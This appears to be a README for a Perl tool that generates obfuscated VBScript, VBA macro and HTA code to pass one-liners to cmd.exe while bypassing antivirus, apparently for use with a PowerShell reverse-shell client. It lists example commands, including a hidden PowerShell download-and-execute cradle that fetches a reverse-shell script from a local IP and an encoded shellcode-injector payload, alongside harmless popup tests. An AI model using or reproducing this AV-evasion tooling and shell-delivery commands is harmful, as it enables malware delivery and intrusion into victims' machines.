# gen-obfuscated

### Generate Obfuscated Code
This is a simple perl program that generates obfuscated vbs/vba code
for use in passing a command to cmd /c while bypassing AV.

To set the options you will need to edit the .pl file directly this is not just a
simple program with preset payloads. It's designed to take in any
type of one-liner you can think of passing to "cmd.exe /c".

Made to be used along with the async-client powershell script, but any one-liner
that get's you a shell should work.

Generated Output of an obfuscated command string:

### UPDATE
Now has an interactive user prompt just run it from the terminal.

```
./gen-obfuscated.pl
```
The below can still give you ideas of what commands to run and should help you get started.

```
gen-obfuscated.pl

##[  Options ]
#
# The options are included inside due to the tricky nature of escaping powershell code passed as an
# argument from the bash shell, also I don't need too since now the commands are directly taken from the
# user interactively.

##[ Script Type to generate ]
#
# 1 for vbscript
# 2 for vba macro ---> EXPERIMENTAL large macros can be generated affects still unknown...
# 3 for hta script
#
##[ Encode Your IEX? ]
#
# base64 encoding in Powershell, set to false if you already have a base64 encoded payload or
# you want your iex only obfuscated by ascii code.
#
##[ PowerShell IEX ]
#
# The command you wish to be base64 encoded
# iex (New-Object -ComObject Wscript.Shell).Popup('IEX Decoded and Executed!',0,'Done',0x1)
#
# If you already have a powershell command with encoding, for example this can also be used with the 
# alphanumeric shellcode injector payload generated by the setoolkit, I warn you this will create a 
# very long script upwards of 350 lines...
#
# cmd /c powershell -w hidden -enc <-base64 encoded string-> 
#
# Only use ascii chr function obfuscation
# cmd /c powershell -w hidden -c iex (New-Object System.Net.WebClient).DownloadString('http://192.168.1.110/rvs-sh')
#
# OR
#
# A command that produces a popup, for testing only using ascii chr function obfuscation
# cmd /c powershell -w hidden -c iex (New-Object -ComObject Wscript.Shell).Popup('IEX Decoded and Executed!',0,'Done',0x1););
#
# OR
#
# A command using javascript to pass commands directly to mshta, for maximum effect use script type 3
# cmd /c mshta "javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( 'Javascript decoded and Executed', 15, 'From gen-obfuscated', 64 );close()");
#
# Be Creative...
